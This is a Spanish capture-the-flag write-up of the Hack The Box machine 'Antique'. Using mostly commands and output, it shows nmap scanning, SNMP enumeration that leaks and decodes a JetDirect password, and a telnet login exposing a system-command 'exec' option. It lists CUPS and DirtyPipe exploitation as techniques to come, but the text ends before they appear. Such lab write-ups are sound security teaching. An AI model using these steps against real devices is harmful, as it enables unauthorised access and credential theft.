# Maquina Antique

Maquina de resolución fácíl. Básicamente accedemos a un servidor de impresión HP JetDirect.

Las técnicas que veremos son:

* SNMP Enumeration
* Network Printer Abuse
* CUPS Administration Exploitation (ErrorLog)
* EXTRA -> (DirtyPipe) [CVE-2022-0847]"


## Enumeración

### Primera vez, 10/07/2022 - Guardamar de la Safor

Primero realizamos un escaneo rápido y silencioso.

<pre>
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.107 -oG allPorts
</pre>

Nos devuelve un único puerto, el 23.

<pre>
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.107 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 01:36 CEST
Initiating SYN Stealth Scan at 01:36
Scanning 10.10.11.107 [65535 ports]
Discovered open port 23/tcp on 10.10.11.107
Completed SYN Stealth Scan at 01:37, 12.76s elapsed (65535 total ports)
Nmap scan report for 10.10.11.107
Host is up, received user-set (0.053s latency).
Scanned at 2022-07-11 01:36:59 CEST for 13s
Not shown: 65533 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.93 seconds
           Raw packets sent: 66376 (2.921MB) | Rcvd: 65845 (2.634MB)

</pre>

Podemos realizar un escaneo exhaustivo al puerto 23 con:

<pre>
nmap -sCV -p23 10.10.11.107 -oN targeted
</pre>

Esto nos dice poco, peor sabemos que el pueto 23 es un puerto telnet.


<pre>
❯ /bin/cat targeted
# Nmap 7.92 scan initiated Sun Jul 10 22:21:25 2022 as: nmap -sCV -p23 -oN targeted 10.10.11.107
Nmap scan report for 10.10.11.107
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.92%I=7%D=7/10%Time=62CB34CC%P=x86_64-pc-linux-gnu%r(NULL
SF:,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPas
SF:sword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetReq
SF:uest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\x2
SF:0JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNS
SF:VersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatusR
SF:equestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x20J
SF:etDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassword:
SF:\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Kerbe
SF:ros,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x20J
SF:etDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPasswor
SF:d:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r
SF:(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,19,
SF:"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDire
SF:ct\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:\x
SF:20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(TerminalSe
SF:rver,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetDire
SF:ct\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\x20
SF:")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,19,"
SF:\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDirect
SF:\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x20")
SF:%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20JetD
SF:irect\n\nPassword:\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 10 22:24:10 2022 -- 1 IP address (1 host up) scanned in 165.07 seconds
</pre>

## Explotación

### Primer método.

Este método de explotación se ha etudiado viendo el vídeo de **S4vitar**:

[S4ViOnLive HackTheBox | Antique](https://www.youtube.com/watch?v=pvtergVU__4)  

En este vídeo se nos presenta la utilidad **snmpwalk** para enumeración snmp. Sabemos que es snmp porque es un servidor de impresión pero podriamos haberlo averiuado haciendo un escaneo de puertos UDP.

<pre>
nmap -sU --top-ports 100 --open -T5 -v -n 10.10.11.107
</pre>

Aqui veríamos que está abierto el puerto **UDP 161 - snmp**

<pre>
❯ nmap -sU --top-ports 100 --open -T5 -v -n 10.10.11.107
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 02:11 CEST
Initiating Ping Scan at 02:11
Scanning 10.10.11.107 [4 ports]
Completed Ping Scan at 02:11, 0.08s elapsed (1 total hosts)
Initiating UDP Scan at 02:11
Scanning 10.10.11.107 [100 ports]
Discovered open port 161/udp on 10.10.11.107
Warning: 10.10.11.107 giving up on port because retransmission cap hit (2).
Completed UDP Scan at 02:11, 4.53s elapsed (100 total ports)
Nmap scan report for 10.10.11.107
Host is up (0.041s latency).
Not shown: 89 open|filtered udp ports (no-response), 10 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.82 seconds
           Raw packets sent: 321 (18.892KB) | Rcvd: 12 (939B)
</pre>

La utilidad ostrada por **S4vitar** nos indica varoas coas, pero la mas importante es el número 1 del final. S o se le pasa número toma por defecto el 2 que es un nodo por encima de la ráiz:

<pre>
snmpwalk -c public -v2c 10.10.11.107
iso.3.6.1.2.1 = STRING: "HTB Printer"
</pre>

Nos devuelve información del sercidor de impresión. Si le ponemos un 1 nos dá información desde el inicio del árbol de la jerarquia.


<pre>
 snmpwalk -c public -v2c 10.10.11.107 1
iso.3.6.1.2.1 = STRING: "HTB Printer"
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
iso.3.6.1.4.1.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
</pre>

Vemo que devueve información sensible. Desde la palabra BITS se muestra un código que a priori parece la representación númerica de un código hexadecimal ya que inguno supera los 3 dígitos ni el número 255. Para decodificar la secuencia hexadecimal hacemos lo siguiente:


<pre>
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xargs | xxd -ps -r
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xargs | xxd -ps -r
P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i	IYaA"1&1A5# "2Rbs3CSs$4EuWGW(8i	IYaA"1&1A5# 
</pre>

Podemos intuir que la password es **P@ssw0rd@123!!123**.
Tambien podríamos haberlo decodificado en alguna herramienta online.

Probamos a entrar con dicha password.

<pre>
❯ telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123q

Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
> 
</pre>









